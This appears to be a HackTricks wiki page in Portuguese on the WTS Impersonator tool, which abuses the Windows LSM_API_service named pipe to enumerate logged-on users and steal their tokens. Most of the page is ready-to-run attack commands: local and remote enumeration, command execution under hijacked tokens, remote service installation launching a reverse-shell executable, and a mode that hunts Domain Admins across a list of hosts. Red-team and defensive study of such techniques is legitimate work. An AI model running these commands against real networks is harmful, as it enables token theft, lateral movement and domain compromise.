{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

A ferramenta **WTS Impersonator** explora o **"\\pipe\LSM_API_service"** RPC Named pipe para enumerar de forma furtiva os usuários logados e sequestrar seus tokens, contornando técnicas tradicionais de Impersonação de Token. Essa abordagem facilita movimentos laterais sem costura dentro das redes. A inovação por trás dessa técnica é creditada a **Omri Baso, cujo trabalho está acessível no [GitHub](https://github.com/OmriBaso/WTSImpersonator)**.

### Funcionalidade Principal
A ferramenta opera através de uma sequência de chamadas de API:
```powershell
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
### Módulos Principais e Uso
- **Enumerando Usuários**: A enumeração de usuários locais e remotos é possível com a ferramenta, usando comandos para cada cenário:
- Localmente:
```powershell
.\WTSImpersonator.exe -m enum
```
- Remotamente, especificando um endereço IP ou nome de host:
```powershell
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Executando Comandos**: Os módulos `exec` e `exec-remote` requerem um contexto de **Serviço** para funcionar. A execução local simplesmente precisa do executável WTSImpersonator e um comando:
- Exemplo para execução de comando local:
```powershell
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- PsExec64.exe pode ser usado para obter um contexto de serviço:
```powershell
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Execução Remota de Comandos**: Envolve a criação e instalação de um serviço remotamente, semelhante ao PsExec.exe, permitindo a execução com permissões apropriadas.
- Exemplo de execução remota:
```powershell
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **Módulo de Caça a Usuários**: Alvo de usuários específicos em várias máquinas, executando código sob suas credenciais. Isso é especialmente útil para direcionar Administradores de Domínio com direitos de administrador local em vários sistemas.
- Exemplo de uso:
```powershell
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```


{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os repositórios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
